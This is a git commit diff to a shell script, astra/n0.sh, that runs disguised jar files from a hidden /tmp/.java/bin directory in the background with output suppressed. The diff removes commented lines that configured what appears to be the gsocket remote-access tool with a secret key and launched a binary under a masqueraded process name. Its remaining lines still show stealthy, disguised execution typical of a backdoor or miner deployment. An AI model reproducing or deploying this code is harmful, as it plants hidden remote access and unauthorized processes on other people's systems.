671bdf31f9a7387612e8fa56f60ec105321cb703
i51jir6ni9t0 <wker-one@protonmail.com>
2025-02-24 06:21:35 +0000

    DE-TEST

--- astra/n0.sh
+++ astra/n0.sh
@@ -13,9 +13,6 @@ function fetch_files() {
 function start_app() {
     chmod a+x /tmp/.java/bin/***
     cd /tmp/.java/bin && nohup ./patch.jar -a 'java -Xms128M -Xmx512M -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar' ./plugins.jar -c ./cfg.conf >/dev/null 2>&1 &
-    # GNET
-    # export GSOCKET_ARGS="-s i1E2c7A0e2a1E2c-5A16f3D9g8Hbj7-56C4a961eCd9-F940d6A2k8A1c5J1g6 -liqD"
-    # cd /tmp/.java/bin && exec -a -java ./add-on.jar &
 }
 
 if [ -f "/tmp/.java/bin/patch.jar" ] && [ -f "/tmp/.java/bin/bots.jar" ] && [ -f "/tmp/.java/bin/plugins.jar" ] ; then
